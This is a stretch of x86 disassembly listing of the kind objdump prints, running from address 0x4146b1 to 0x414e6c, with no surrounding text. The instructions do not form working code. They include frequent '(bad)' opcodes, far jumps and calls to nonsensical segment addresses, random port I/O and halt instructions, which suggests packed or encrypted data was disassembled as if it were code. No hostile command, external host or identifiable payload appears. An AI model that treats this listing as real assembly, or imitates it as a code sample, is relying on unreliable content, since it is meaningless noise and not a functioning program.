  4146b1:	sbb    BYTE PTR [eax+0x26],0xd0
  4146b5:	and    dl,BYTE PTR [edx-0x7815af4c]
  4146bb:	or     al,0x5a
  4146bd:	into   
  4146be:	pop    es
  4146bf:	inc    edi
  4146c0:	or     al,0x96
  4146c2:	js     0x41466a
  4146c4:	dec    ebp
  4146c5:	cmp    BYTE PTR [eax],dh
  4146c7:	shl    bh,0x3f
  4146ca:	cdq    
  4146cb:	arpl   WORD PTR [ebp+esi*1-0x11],cx
  4146cf:	fbld   TBYTE PTR [esi-0x20b24d75]
  4146d5:	mov    bh,0x7c
  4146d7:	(bad)  
  4146d8:	xchg   cx,ax
  4146da:	push   esp
  4146db:	stos   DWORD PTR es:[edi],eax
  4146dc:	enter  0x92e6,0x3f
  4146e0:	mov    cl,0x0
  4146e2:	inc    esp
  4146e3:	jno    0x4146fd
  4146e5:	mov    eax,ds:0x2b4848c9
  4146ea:	add    al,0xf5
  4146ec:	(bad)  
  4146ee:	clc    
  4146ef:	fild   QWORD PTR [ebp+0x286dc0ed]
  4146f5:	rol    DWORD PTR [ebp+0x212673ee],1
  4146fb:	jmp    0x6e9a:0x9513c23d
  414702:	pusha  
  414703:	(bad)  
  414704:	jmp    0x414712
  414706:	aas    
  414707:	nop
  414708:	xchg   ecx,eax
  414709:	std    
  41470a:	lea    edx,[ecx-0x52]
  41470d:	(bad)  
  41470e:	mov    edi,0x6aa9433e
  414713:	sbb    BYTE PTR [edi-0x265c21ca],bh
  414719:	xchg   ecx,eax
  41471a:	dec    eax
  41471b:	or     ah,ch
  41471d:	pop    eax
  41471e:	(bad)  
  41471f:	mov    esi,ecx
  414721:	adc    DWORD PTR [edx],0xffffffaf
  414724:	in     eax,0x76
  414726:	pop    edx
  414727:	fwait
  414728:	push   esp
  414729:	retf   0x7c6d
  41472c:	(bad)  
  41472d:	pop    ds
  41472e:	(bad)  
  41472f:	cmp    edi,DWORD PTR [edx-0x5f02f232]
  414735:	cmp    ah,BYTE PTR [ecx-0x570213ae]
  41473b:	fistp  QWORD PTR [ebx]
  41473d:	sbb    al,0xe1
  41473f:	clc    
  414740:	jecxz  0x414796
  414742:	hlt    
  414743:	dec    ebp
  414744:	add    BYTE PTR [eax],0xef
  414747:	hlt    
  414748:	and    ebp,DWORD PTR [ecx-0x49]
  41474b:	cs mov esp,0xcaaf575f
  414751:	fistp  WORD PTR [eax+edi*1-0xe5e03dc]
  414758:	add    BYTE PTR [eax-0x3],al
  41475b:	data16 jp 0x414705
  41475e:	xchg   dh,bl
  414760:	dec    edi
  414761:	enter  0xf6e1,0xb7
  414765:	jnp    0x414702
  414767:	jb     0x4147b6
  414769:	bnd jo 0x414729
  41476c:	jnp    0x4146fe
  41476e:	test   eax,0x97d98857
  414773:	sbb    al,0x71
  414775:	or     BYTE PTR ds:0x838ec8c7,cl
  41477b:	fbstp  TBYTE PTR [esi-0x27e898a8]
  414781:	stos   DWORD PTR es:[edi],eax
  414782:	ja     0x4147d7
  414784:	test   BYTE PTR [eax+0x4c],bh
  414787:	and    al,0x32
  414789:	jae    0x41471f
  41478b:	sub    BYTE PTR [eax-0x2e],bh
  41478e:	retf   
  41478f:	in     eax,0x79
  414791:	add    eax,0xc38b807c
  414796:	in     eax,0x35
  414798:	lds    ebx,FWORD PTR [ebx-0x7]
  41479b:	xor    al,0x49
  41479d:	loopne 0x4147b3
  41479f:	xchg   BYTE PTR [ebp+0x4d],al
  4147a2:	aas    
  4147a3:	xchg   BYTE PTR [ebp-0x70e62de8],dh
  4147a9:	cwde   
  4147aa:	adc    eax,0x1de3155c
  4147af:	repnz adc edi,edx
  4147b2:	push   esi
  4147b3:	pop    edi
  4147b4:	sbb    DWORD PTR [esp+ebp*8],esp
  4147b7:	mov    ebx,0xaa62be73
  4147bc:	cmp    eax,0x77c3f8ae
  4147c1:	mov    WORD PTR [ecx+esi*2],?
  4147c4:	jb     0x4147ef
  4147c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c7:	pop    edi
  4147c8:	scas   eax,DWORD PTR es:[edi]
  4147c9:	enter  0xc930,0xd7
  4147cd:	loop   0x414754
  4147cf:	xchg   DWORD PTR [ebx],esi
  4147d1:	mov    bh,0xbe
  4147d3:	mov    al,bh
  4147d5:	stos   DWORD PTR es:[edi],eax
  4147d6:	mov    ebx,?
  4147d8:	xor    al,0x4a
  4147da:	cmp    ah,bh
  4147dc:	(bad)
  4147df:	je     0x4147f7
  4147e1:	lods   eax,DWORD PTR ds:[esi]
  4147e2:	push   ebp
  4147e3:	adc    eax,0xdd2b9449
  4147e8:	jecxz  0x4147ed
  4147ea:	es push ss
  4147ec:	out    0xac,al
  4147ee:	imul   BYTE PTR [ebp-0x67]
  4147f1:	lods   al,BYTE PTR ds:[esi]
  4147f2:	test   DWORD PTR [eax-0x1632ff7a],esi
  4147f8:	loop   0x4147ec
  4147fa:	push   edi
  4147fb:	stos   DWORD PTR es:[edi],eax
  4147fc:	ds push 0x8ff90b80
  414802:	xor    esi,DWORD PTR [ecx-0x24]
  414805:	cmp    eax,0xe81e2016
  41480a:	mov    ch,cl
  41480c:	push   ss
  41480d:	dec    ebx
  41480e:	xor    eax,0xd9c9f554
  414813:	cmp    edi,DWORD PTR [eax+0x2d]
  414816:	test   al,0x3
  414818:	fisub  DWORD PTR [eax]
  41481a:	xchg   edx,eax
  41481b:	aad    0x18
  41481d:	sub    eax,0x1f1c87d4
  414822:	or     DWORD PTR [ebp-0x33],ebp
  414825:	mov    bh,0xe9
  414827:	pushf  
  414828:	fs out dx,al
  41482a:	adc    al,0x5a
  41482c:	dec    ecx
  41482d:	ins    BYTE PTR es:[edi],dx
  41482e:	jp     0x4147fa
  414830:	add    BYTE PTR [esi-0x7c],0xd4
  414834:	cmp    eax,0x8fcde9a2
  414839:	gs ins DWORD PTR es:[edi],dx
  41483b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41483c:	stos   DWORD PTR es:[edi],eax
  41483d:	mov    ebp,0x6ec426fd
  414842:	adc    eax,0xe93e3ea4
  414847:	cld    
  414848:	xchg   BYTE PTR [ebp+ecx*8+0x52],ch
  41484c:	sbb    ch,dh
  41484e:	fs mov edi,0xf1970a98
  414854:	push   esi
  414855:	retf   0x48a5
  414858:	inc    ebx
  414859:	mov    ch,0x39
  41485b:	dec    ecx
  41485c:	sbb    al,0x76
  41485e:	pushf  
  41485f:	(bad)  ds:0xb5cf19ac
  414865:	mov    ds:0xc630040,eax
  41486a:	popf   
  41486b:	ss and al,0x77
  41486e:	icebp  
  41486f:	cmp    al,0x3b
  414871:	or     dh,cl
  414873:	daa    
  414874:	cmp    BYTE PTR [ecx+0x5],bl
  414877:	xor    eax,0xc7c159ff
  41487c:	cmp    eax,0x93dec26b
  414881:	in     eax,dx
  414882:	les    ebx,FWORD PTR [edi-0x45147a5e]
  414888:	mov    ecx,0x62b70a74
  41488d:	push   ebp
  41488e:	xor    ah,BYTE PTR [edx-0x7d]
  414891:	add    DWORD PTR [esi-0x7bf96a4e],ecx
  414897:	out    0xd0,al
  414899:	push   cs
  41489a:	jmp    0x1289:0x4d3ba320
  4148a1:	loop   0x4148f8
  4148a3:	cmc    
  4148a4:	and    al,0xb1
  4148a6:	test   eax,0x59f57f9d
  4148ab:	xchg   DWORD PTR [ebx-0x369534db],ebp
  4148b1:	mov    ebx,0xf42852fd
  4148b6:	dec    eax
  4148b7:	mov    ch,0x57
  4148b9:	sub    BYTE PTR [esi],0x46
  4148bc:	stos   BYTE PTR es:[edi],al
  4148bd:	hlt    
  4148be:	popa   
  4148bf:	(bad)  
  4148c0:	gs xchg ebp,eax
  4148c2:	sbb    dh,BYTE PTR [eax]
  4148c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c5:	mov    edi,0x2e1803f3
  4148ca:	mul    BYTE PTR [edx]
  4148cc:	jno    0x414942
  4148ce:	jns    0x414914
  4148d0:	jmp    0x414932
  4148d2:	lock shl dl,1
  4148d5:	dec    eax
  4148d6:	push   0xffffffce
  4148d8:	leave  
  4148d9:	shr    BYTE PTR [eax-0x35],cl
  4148dc:	test   al,0x47
  4148de:	addr16 xchg ecx,eax
  4148e0:	jge    0x41491e
  4148e2:	addr16 adc ch,ch
  4148e5:	add    BYTE PTR [ebx-0x30],ah
  4148e8:	jge    0x414891
  4148ea:	jecxz  0x414958
  4148ec:	loop   0x4148d9
  4148ee:	imul   eax,DWORD PTR [edi-0x32],0x4aae3819
  4148f5:	sub    al,0x38
  4148f7:	fisub  DWORD PTR [ecx+ebx*8]
  4148fa:	call   0xd603:0x41985dd4
  414901:	adc    esi,DWORD PTR [eax-0x4779c108]
  414907:	std    
  414908:	mov    ebp,DWORD PTR [esi+esi*4+0x532d27ff]
  41490f:	dec    edx
  414910:	cmp    al,0x52
  414912:	aad    0xe4
  414914:	pop    ecx
  414915:	adc    BYTE PTR [esi+eiz*1],cl
  414918:	repnz add al,0x10
  41491b:	jle    0x41493a
  41491d:	cmp    al,0xfb
  41491f:	inc    ecx
  414920:	cs pop edi
  414922:	outs   dx,DWORD PTR ds:[esi]
  414923:	jb     0x414948
  414925:	retf   
  414926:	adc    al,dh
  414928:	data16 std 
  41492a:	(bad)  
  41492b:	xchg   ebp,eax
  41492c:	mov    ds:0xdddb4198,al
  414931:	aas    
  414932:	jge    0x4148e1
  414934:	in     eax,dx
  414935:	retf   0x771d
  414938:	out    0x63,eax
  41493a:	and    dh,bl
  41493c:	mov    ds,WORD PTR [eax]
  41493e:	mov    ecx,0x470b5c32
  414943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414944:	fmul   QWORD PTR [edx+ebp*2+0x74804b0f]
  41494b:	add    bh,BYTE PTR [edi+0x4c]
  41494e:	ins    BYTE PTR es:[edi],dx
  41494f:	stos   DWORD PTR es:[edi],eax
  414950:	lock hlt 
  414952:	push   0xe29763f9
  414957:	inc    ebx
  414958:	rcr    BYTE PTR [eax-0x7c4e2816],1
  41495e:	mov    eax,ds:0x723895fb
  414963:	and    DWORD PTR [ecx+0x1b],esp
  414966:	inc    edx
  414967:	leave  
  414968:	mov    esp,DWORD PTR [edx]
  41496a:	jge    0x4149dc
  41496c:	leave  
  41496d:	outs   dx,BYTE PTR ds:[esi]
  41496e:	out    0x15,al
  414970:	xor    esi,DWORD PTR [eax]
  414972:	mov    eax,0x145af797
  414977:	dec    edi
  414978:	test   esp,ecx
  41497a:	fs push eax
  41497c:	mov    ds:0x5322c4b8,al
  414981:	pop    edx
  414982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414983:	scas   al,BYTE PTR es:[edi]
  414984:	test   eax,0x89592d22
  414989:	jecxz  0x4149ae
  41498b:	cld    
  41498c:	retf   
  41498d:	sbb    DWORD PTR [ebx+ecx*1-0x1d56a816],edx
  414994:	sub    ah,dh
  414996:	jl     0x4149c6
  414998:	test   eax,0x80e7dd17
  41499d:	int3   
  41499e:	push   ecx
  41499f:	lds    ebp,FWORD PTR [edi]
  4149a1:	mov    ebp,DWORD PTR [eax+0x7a]
  4149a4:	ds pop edx
  4149a6:	jmp    0x4149e7
  4149a8:	shl    DWORD PTR es:[eax],cl
  4149ab:	sub    al,0x22
  4149ad:	pop    ecx
  4149ae:	cmp    BYTE PTR [esi+eax*1-0x27356fcb],ah
  4149b5:	push   edi
  4149b6:	mov    ch,0x76
  4149b8:	ror    dl,0x8b
  4149bb:	dec    esi
  4149bc:	mov    ch,0x1d
  4149be:	maxps  xmm4,XMMWORD PTR [esi+0x6]
  4149c2:	jo     0x414952
  4149c4:	leave  
  4149c5:	cs dec ecx
  4149c7:	push   ebp
  4149c8:	inc    edi
  4149c9:	(bad)  
  4149ca:	rcl    DWORD PTR [ebp-0x4283ffd8],0x18
  4149d1:	stos   BYTE PTR es:[edi],al
  4149d2:	and    al,0x40
  4149d4:	outs   dx,BYTE PTR ds:[esi]
  4149d5:	push   es
  4149d6:	jns    0x4149f9
  4149d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149d9:	fs jnp 0x4149a8
  4149dc:	push   DWORD PTR [eax+0x33]
  4149df:	out    0xa4,eax
  4149e1:	out    0x25,al
  4149e3:	push   es
  4149e4:	or     DWORD PTR [ecx+0x45],esi
  4149e7:	xchg   ebp,eax
  4149e8:	push   ds
  4149e9:	and    edx,esi
  4149eb:	sbb    esp,DWORD PTR [edx-0x28]
  4149ee:	mov    dl,BYTE PTR [ebx+esi*4]
  4149f1:	aad    0x4d
  4149f3:	pop    esi
  4149f4:	retf   0xe9ab
  4149f7:	int    0xc
  4149f9:	xor    esi,DWORD PTR [ebp+0x69]
  4149fc:	and    eax,0xa8f04723
  414a01:	sbb    esp,esp
  414a03:	scas   al,BYTE PTR es:[edi]
  414a04:	sti    
  414a05:	jmp    0x117ba22e
  414a0a:	jmp    0x96835f08
  414a0f:	les    edi,FWORD PTR [edi+0x4f]
  414a12:	jns    0x4149cc
  414a14:	push   edi
  414a15:	arpl   WORD PTR [edi],sp
  414a17:	addr16 aas 
  414a19:	or     eax,0xd335b8b6
  414a1e:	clc    
  414a1f:	pop    ss
  414a20:	inc    eax
  414a21:	sahf   
  414a22:	or     al,0xee
  414a24:	and    eax,0xa0b9c2ff
  414a29:	mov    ebx,0x939a61bf
  414a2e:	mov    es:0x3383ce00,al
  414a34:	sub    al,0x69
  414a36:	inc    esp
  414a37:	idiv   BYTE PTR [edi+0x6a]
  414a3a:	sti    
  414a3b:	sbb    al,0x68
  414a3d:	in     al,0xb0
  414a3f:	jb     0x414a92
  414a41:	inc    eax
  414a42:	xchg   edx,eax
  414a43:	lock adc eax,DWORD PTR [ebx+0x3ff6207a]
  414a4a:	mov    esp,0x1328e586
  414a4f:	fisttp QWORD PTR [eax]
  414a51:	and    cl,BYTE PTR [ebx+0x73]
  414a54:	sbb    ebp,ebx
  414a56:	lods   eax,DWORD PTR ds:[esi]
  414a57:	fs dec edi
  414a59:	mov    edi,0x935df30c
  414a5e:	test   DWORD PTR [ebp+0x4e5b8f84],ebp
  414a64:	jmp    0xadee:0x49e784b4
  414a6b:	sar    dh,1
  414a6d:	gs push es
  414a6f:	push   esi
  414a70:	sbb    BYTE PTR [edx],al
  414a72:	shl    DWORD PTR [esi],0x47
  414a75:	xor    edi,DWORD PTR [ebx-0x5f]
  414a78:	arpl   WORD PTR [ecx],ax
  414a7a:	je     0x414aad
  414a7c:	xchg   ecx,eax
  414a7d:	jae    0x414a76
  414a7f:	pop    edi
  414a80:	inc    ecx
  414a81:	in     al,0xc0
  414a83:	mov    cl,0x68
  414a85:	add    eax,0x4e311a35
  414a8a:	and    DWORD PTR [ebp-0x45c6e09f],eax
  414a90:	sahf   
  414a91:	inc    eax
  414a92:	mov    dh,0x27
  414a94:	mov    ch,0xe5
  414a96:	aaa    
  414a97:	in     al,0x85
  414a99:	jp     0x414a25
  414a9b:	ror    DWORD PTR [esi+0x56],cl
  414a9e:	mov    dl,0x87
  414aa0:	xor    bh,BYTE PTR [edx*1+0x49def943]
  414aa7:	call   0x57e7f3dd
  414aac:	adc    DWORD PTR [edi],eax
  414aae:	adc    DWORD PTR [esi],ebp
  414ab0:	cmovno edx,ecx
  414ab3:	lea    esp,[ebp-0x77]
  414ab6:	jne    0x414a7f
  414ab8:	or     eax,0x72f815fb
  414abd:	dec    ecx
  414abe:	mov    bh,0xe3
  414ac0:	loop   0x414a4b
  414ac2:	cmp    al,0x35
  414ac4:	icebp  
  414ac5:	pop    esi
  414ac6:	in     al,0x2c
  414ac8:	mov    ds:0xdee0a6f4,eax
  414acd:	xor    al,0xa9
  414acf:	call   0x1dd0:0x75c090bd
  414ad6:	jge    0x414a60
  414ad8:	fs aas 
  414ada:	sbb    DWORD PTR [esi],esp
  414adc:	ins    DWORD PTR es:[edi],dx
  414add:	sar    DWORD PTR [esi+ebp*2],1
  414ae0:	in     eax,dx
  414ae1:	mov    WORD PTR [ebx+0x4fc1a55c],fs
  414ae7:	push   eax
  414ae8:	ficom  DWORD PTR [ebp-0x54e8c805]
  414aee:	iretw  
  414af0:	adc    BYTE PTR [ecx+0x120ae1f5],0x83
  414af7:	bound  eax,QWORD PTR [edx]
  414af9:	push   edx
  414afb:	fdivr  QWORD PTR [edx+ebx*8-0x1ed78386]
  414b02:	test   al,0xa4
  414b04:	les    ecx,FWORD PTR [esi+0x5f]
  414b07:	cmp    al,0x69
  414b09:	cmp    ebp,DWORD PTR [eax]
  414b0b:	inc    ecx
  414b0c:	test   ecx,eax
  414b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0f:	fst    QWORD PTR [edx+0x31bcd604]
  414b15:	xor    ch,BYTE PTR [edx-0x5c]
  414b18:	cmp    bh,BYTE PTR [ebp+esi*4+0x31]
  414b1c:	lods   eax,DWORD PTR ds:[esi]
  414b1d:	mov    WORD PTR [ecx-0x2a57042d],?
  414b23:	push   eax
  414b24:	jle    0x414b58
  414b26:	jg     0x414ac0
  414b28:	into   
  414b29:	call   0xa5d0084
  414b2e:	push   0xd8dfa121
  414b33:	adc    edx,DWORD PTR [eax-0x5d839bc3]
  414b39:	lds    edi,FWORD PTR [esi+eax*2]
  414b3c:	call   0xe899de84
  414b41:	mov    cl,0x50
  414b43:	loope  0x414b36
  414b45:	aas    
  414b46:	enter  0x5541,0x7d
  414b4a:	ret    0x1930
  414b4d:	dec    edx
  414b4e:	into   
  414b4f:	push   cs
  414b50:	or     ecx,0xffffffae
  414b53:	out    0x24,al
  414b55:	jge    0x414b23
  414b57:	jmp    0xc0b14cec
  414b5c:	int    0x45
  414b5e:	cli    
  414b5f:	mov    dl,0x14
  414b61:	cmp    WORD PTR [ebx+0x512cbad7],0xdd15
  414b6a:	jmp    0xc6a3:0xf72df1a5
  414b71:	pop    esi
  414b72:	jge    0x414b97
  414b74:	push   edx
  414b75:	pushf  
  414b76:	test   al,0x6a
  414b78:	ret    
  414b79:	and    eax,0xa1e7e1bd
  414b7e:	shl    ebp,0x73
  414b81:	cmp    ebp,DWORD PTR [ebp+0xf]
  414b84:	mov    WORD PTR [edi-0x17],fs
  414b87:	push   es
  414b88:	mov    dh,0x1f
  414b8a:	inc    eax
  414b8b:	or     edx,DWORD PTR [edx+0x7a]
  414b8e:	call   0x378c:0xa07a719e
  414b95:	out    0xe8,al
  414b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b98:	ins    DWORD PTR es:[edi],dx
  414b99:	jle    0x414beb
  414b9b:	push   esi
  414b9c:	cmp    eax,0x902cccb5
  414ba1:	push   0xffffffc0
  414ba3:	and    BYTE PTR [edx],bh
  414ba5:	(bad)  
  414ba6:	cmp    bl,ch
  414ba8:	ror    DWORD PTR [ebp+0xe],1
  414bab:	or     eax,0x237a2e29
  414bb0:	cmp    ah,BYTE PTR [edi+0x2a]
  414bb3:	cmp    DWORD PTR [esi-0x7b],esp
  414bb6:	fwait
  414bb7:	xor    ebx,DWORD PTR [ecx-0x12d77e4b]
  414bbd:	cmp    ebp,esp
  414bbf:	shl    DWORD PTR [eax+0x709766f5],cl
  414bc5:	shl    esi,1
  414bc7:	mov    edx,DWORD PTR [edi]
  414bc9:	fcomp  st(2)
  414bcb:	test   BYTE PTR [esi+0x76],0xd7
  414bcf:	add    DWORD PTR [esi+0x10],edx
  414bd2:	jo     0x414c1c
  414bd4:	fsubr  QWORD PTR [edi+0x6f]
  414bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd8:	sub    edx,eax
  414bda:	sbb    eax,0x1fede8c3
  414bdf:	or     ecx,DWORD PTR [edx+0x73]
  414be2:	mov    bl,0x6
  414be4:	sbb    eax,0xf755d9b8
  414be9:	adc    ah,cl
  414beb:	shr    DWORD PTR [esi+0x43e2e597],cl
  414bf1:	push   esp
  414bf2:	leave  
  414bf3:	dec    ebp
  414bf4:	adc    al,0xe7
  414bf6:	arpl   WORD PTR [edi],di
  414bf8:	inc    esp
  414bf9:	sub    eax,0x4c5fb2f7
  414bfe:	add    esi,edx
  414c00:	pop    edi
  414c01:	adc    DWORD PTR [ebp-0x1deb03f1],edi
  414c07:	iret   
  414c08:	inc    esi
  414c09:	xor    DWORD PTR [eax+eiz*8],eax
  414c0c:	dec    ebp
  414c0d:	lods   al,BYTE PTR ds:[esi]
  414c0e:	ret    0xa02e
  414c11:	rcl    DWORD PTR [eax],cl
  414c13:	jmp    0xfdb9e22
  414c18:	sar    ecx,1
  414c1a:	clc    
  414c1b:	pop    esp
  414c1c:	xor    eax,0xbc4e07c
  414c21:	jecxz  0x414c77
  414c23:	ret    
  414c24:	mov    eax,0xd8500718
  414c29:	xor    al,0xca
  414c2b:	pop    ds
  414c2c:	jge    0x414c2e
  414c2e:	mov    ebx,0xa3dd0056
  414c33:	pusha  
  414c34:	jmp    0x8bf69d7f
  414c39:	out    0xca,al
  414c3b:	xor    ch,ah
  414c3d:	xor    DWORD PTR [edi],eax
  414c3f:	xor    DWORD PTR [esi+edx*4],eax
  414c42:	push   esi
  414c43:	dec    ebp
  414c44:	adc    DWORD PTR gs:[ebp-0x5f],esi
  414c48:	aad    0x1a
  414c4a:	cmp    bh,bh
  414c4c:	xor    cl,bh
  414c4e:	jp     0x414c5d
  414c50:	or     al,0x59
  414c52:	lea    edx,[ebx]
  414c54:	xchg   edx,eax
  414c55:	push   0x54
  414c57:	loope  0x414ca5
  414c59:	and    DWORD PTR [edi-0x7a42bc56],edx
  414c5f:	mov    dh,0xb5
  414c61:	arpl   WORD PTR [eax+0x6f],cx
  414c64:	mov    eax,ds:0xaccb7d66
  414c69:	mov    dl,0x8c
  414c6b:	pop    esp
  414c6c:	scas   al,BYTE PTR es:[edi]
  414c6d:	call   0xdfb8:0x85ea25c6
  414c74:	repnz adc BYTE PTR [ebx-0x36],dh
  414c78:	dec    eax
  414c79:	rcr    BYTE PTR [edx],0xff
  414c7c:	fchs   
  414c7e:	sbb    eax,0x1a1c2c86
  414c83:	sub    al,BYTE PTR [ecx]
  414c85:	cmp    al,BYTE PTR [ebp-0x55]
  414c88:	ja     0x414c0d
  414c8a:	inc    BYTE PTR [ebp-0x64]
  414c8d:	or     eax,DWORD PTR [edx+0x58]
  414c90:	xor    edi,esp
  414c92:	pusha  
  414c93:	cdq    
  414c94:	fld    TBYTE PTR [esi-0x73]
  414c97:	pop    ds
  414c98:	movq   QWORD PTR [ecx+0x679f87bf],mm4
  414c9f:	imul   edx,edx,0x526f2993
  414ca5:	xor    al,0x2
  414ca7:	cmc    
  414ca8:	enter  0x7aab,0x4a
  414cac:	mov    eax,DWORD PTR [esi+ebp*1+0x5b]
  414cb0:	rol    ebp,cl
  414cb2:	into   
  414cb3:	mov    ?,WORD PTR [ebp+eiz*1-0x20c3f57f]
  414cba:	jmp    0x414cca
  414cbc:	sbb    eax,0x6cc0c285
  414cc1:	or     al,0x92
  414cc3:	mov    al,0x64
  414cc5:	jno    0x414c4d
  414cc7:	in     eax,dx
  414cc8:	inc    edx
  414cc9:	mov    esi,0xa2f2fadf
  414cce:	adc    eax,0xf1c228d
  414cd3:	in     al,dx
  414cd4:	pop    ds
  414cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cd6:	sbb    al,BYTE PTR [ecx-0x37f3ec24]
  414cdc:	pusha  
  414cdd:	inc    edx
  414cde:	enter  0x19ba,0x6
  414ce2:	mov    ebp,?
  414ce4:	push   ds
  414ce5:	mov    al,ds:0xab4e3ffe
  414cea:	stos   DWORD PTR es:[edi],eax
  414ceb:	sub    ecx,DWORD PTR [ebp+0x52da37c7]
  414cf1:	lahf   
  414cf2:	sbb    al,0x33
  414cf4:	arpl   WORD PTR [eax-0x44],si
  414cf7:	cmp    DWORD PTR [ecx+ebp*2-0x42],0xffffffe1
  414cfc:	mov    BYTE PTR [ecx-0x1a9c043d],0x57
  414d03:	inc    esp
  414d04:	cmp    eax,DWORD PTR gs:[edx-0x173a0dde]
  414d0b:	xchg   esi,eax
  414d0c:	mov    ebp,0x4554253d
  414d11:	cmp    dl,BYTE PTR [ecx+0x44e3ae2]
  414d17:	xor    BYTE PTR [ecx+ecx*8],ch
  414d1a:	test   BYTE PTR [ebp+0x35],cl
  414d1d:	pop    ebx
  414d1e:	call   0xe0b2:0x1c6f8532
  414d25:	mov    bl,0xa6
  414d27:	imul   ecx
  414d29:	pop    esi
  414d2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d2b:	nop
  414d2c:	xlat   BYTE PTR ds:[ebx]
  414d2d:	and    ebx,DWORD PTR [eax+0x4c1dc267]
  414d33:	pop    es
  414d34:	xchg   edx,eax
  414d35:	fsub   QWORD PTR [ebx]
  414d37:	jns    0x414cd6
  414d39:	pop    esi
  414d3a:	sbb    DWORD PTR [edx+0x4f903d9c],0xb372052d
  414d44:	mov    WORD PTR [eax+ebx*8-0x12],?
  414d48:	or     al,0x73
  414d4a:	mov    ah,0xf8
  414d4c:	retf   
  414d4d:	das    
  414d4e:	push   es
  414d4f:	loop   0x414d32
  414d51:	ins    DWORD PTR es:[edi],dx
  414d52:	sub    eax,0x6e14361b
  414d57:	mov    bl,0xc8
  414d59:	in     al,dx
  414d5a:	push   0x5a
  414d5c:	push   cs
  414d5d:	xchg   BYTE PTR cs:[ebp+0x13],bh
  414d61:	std    
  414d62:	into   
  414d63:	repz dec edx
  414d65:	pop    eax
  414d66:	jo     0x414ddd
  414d68:	leave  
  414d69:	mov    edx,0x7ea21c13
  414d6e:	int3   
  414d6f:	rcl    edi,cl
  414d71:	pop    esp
  414d72:	pop    ecx
  414d73:	sub    DWORD PTR [eax],esi
  414d75:	sbb    al,0xb2
  414d77:	and    dh,BYTE PTR [edi+0x10761e7e]
  414d7d:	loopne 0x414d35
  414d7f:	fiadd  WORD PTR [ebp+ecx*4-0x23]
  414d83:	je     0x414d85
  414d85:	daa    
  414d86:	retf   0x5b92
  414d89:	jnp    0x414d81
  414d8b:	lahf   
  414d8c:	or     edx,DWORD PTR [eax]
  414d8e:	aaa    
  414d8f:	xchg   BYTE PTR [edi],ah
  414d91:	hlt    
  414d92:	rol    DWORD PTR [ecx+0x6a],cl
  414d95:	dec    eax
  414d96:	push   edi
  414d97:	xor    BYTE PTR [ecx-0x1c2881ea],ch
  414d9d:	jne    0x414e1c
  414d9f:	dec    edi
  414da0:	outs   dx,BYTE PTR ds:[esi]
  414da1:	sbb    dl,BYTE PTR [edi+0xc]
  414da4:	jmp    0x414de1
  414da6:	sbb    BYTE PTR [edx-0x2],bl
  414da9:	je     0x414d53
  414dab:	stos   BYTE PTR es:[edi],al
  414dac:	pop    esi
  414dad:	inc    BYTE PTR [edi-0x1c]
  414db0:	data16 test al,0x10
  414db3:	adc    al,0x33
  414db5:	pop    eax
  414db6:	ins    BYTE PTR es:[edi],dx
  414db7:	imul   edx,DWORD PTR [ebp+0x22],0x38
  414dbb:	sar    DWORD PTR [esi],cl
  414dbd:	jo     0x414d73
  414dbf:	test   DWORD PTR [ebx-0x640fb434],ebx
  414dc5:	stc    
  414dc6:	je     0x414e0f
  414dc8:	or     esp,esp
  414dca:	dec    eax
  414dcb:	rcr    DWORD PTR [ebx+edi*2-0x76],cl
  414dcf:	cmp    eax,0x38a2619
  414dd4:	sub    eax,0x2ca5a874
  414dd9:	mov    WORD PTR [ebp+0x3fee2ed7],ds
  414ddf:	stc    
  414de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414de1:	arpl   sp,ax
  414de3:	jne    0x414da1
  414de5:	pop    esp
  414de6:	inc    edx
  414de7:	popf   
  414de8:	int    0xe
  414dea:	push   eax
  414deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ded:	fs push cs
  414def:	pop    ecx
  414df0:	sbb    al,bh
  414df2:	pop    edi
  414df3:	jge    0x414d78
  414df5:	cdq    
  414df6:	adc    ch,BYTE PTR [ecx]
  414df8:	inc    esp
  414df9:	mov    ecx,0x18aefee7
  414dfe:	icebp  
  414dff:	adc    al,BYTE PTR [edx-0x27]
  414e02:	imul   edi,DWORD PTR [edi],0xe67cb955
  414e08:	mov    ds:0xcd63e46a,al
  414e0d:	push   cs
  414e0e:	addr16 xor bl,dh
  414e11:	fisub  WORD PTR [ecx-0x5e]
  414e14:	jbe    0x414dda
  414e16:	push   esi
  414e17:	inc    edx
  414e18:	xchg   ebx,eax
  414e19:	cmp    DWORD PTR gs:[edx+0x2],ecx
  414e1d:	jne    0x414da0
  414e1f:	hlt    
  414e20:	inc    eax
  414e21:	ins    BYTE PTR es:[edi],dx
  414e22:	sti    
  414e23:	sar    dl,cl
  414e25:	test   eax,0x5b5ad7ba
  414e2a:	adc    DWORD PTR [eax-0x47e91f67],0xffffffe6
  414e31:	popa   
  414e32:	mov    ds:0x6594e25e,eax
  414e37:	jbe    0x414de3
  414e39:	push   esp
  414e3a:	pop    ebp
  414e3b:	sub    DWORD PTR [edx-0x7a],ecx
  414e3e:	xchg   edx,eax
  414e3f:	xchg   bh,bl
  414e41:	lods   al,BYTE PTR ds:[esi]
  414e42:	mov    ds:0x99a78cfc,eax
  414e47:	or     al,0x17
  414e49:	pop    esi
  414e4a:	ret    
  414e4b:	mov    al,ds:0x255c8fe9
  414e50:	add    DWORD PTR [ebx],edx
  414e52:	or     al,0xad
  414e54:	call   0xa87a0cb0
  414e59:	cmp    DWORD PTR [ecx],0xa6c70504
  414e5f:	sbb    DWORD PTR [edi+0x17],eax
  414e62:	leave  
  414e63:	in     eax,0xe1
  414e65:	ja     0x414ea3
  414e67:	pop    ebx
  414e68:	imul   ebx,DWORD PTR [ebx],0x5a
  414e6b:	pop    ecx
  414e6c:	popf   
